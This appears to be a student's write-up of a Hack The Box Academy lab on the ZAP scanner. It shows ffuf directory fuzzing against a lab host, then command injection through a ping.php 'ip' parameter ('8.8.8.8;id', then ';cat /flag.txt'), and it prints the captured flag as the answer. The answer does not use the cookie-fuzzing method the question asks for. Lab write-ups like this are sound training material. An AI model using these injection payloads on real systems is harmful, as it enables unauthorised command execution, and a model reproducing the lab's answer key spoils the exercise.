# Section 13: Zap Scanner

Module: 14. Using Web Proxies

---

## Questions & Answers

### 1. The directory we found above sets the cookie to the md5 hash of the username, as we can see the md5 cookie in the request for the (guest) user. Visit '/skills/' to get a request with a cookie, then try to use ZAP Fuzzer to fuzz the cookie for different md5 hashed usernames to get the flag. Use the "top-usernames-shortlist.txt" wordlist from Seclists.

Context:
- Fuzzing directories:
```bash
┌─[eu-academy-2]─[10.10.14.91]─[htb-ac-2162140@htb-rfpvkxbcle-htb-cloud-com]─[~]
└──╼ [★]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://154.57.164.82:32435/FUZZ -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://154.57.164.82:32435/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

devtools                [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 171ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 196ms]
wp-admin                [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 174ms]
wp-content              [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 173ms]
wp-includes             [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 171ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 211ms]
:: Progress: [4750/4750] :: Job [1/1] :: 227 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
```
- In `/devtools` found `ping.php`, a simple command injection can be used:
```
http://154.57.164.82:32435/devtools/ping.php?ip=8.8.8.8;id
Got:  uid=33(www-data) gid=33(www-data) groups=33(www-data)

http://154.57.164.82:32435/devtools/ping.php?ip=8.8.8.8;cat /flag.txt
Got:  HTB{5c4nn3r5_f1nd_vuln5_w3_m155} 
```

**Answer:** ` HTB{5c4nn3r5_f1nd_vuln5_w3_m155}`

---

[Back to Module Index](./README.md)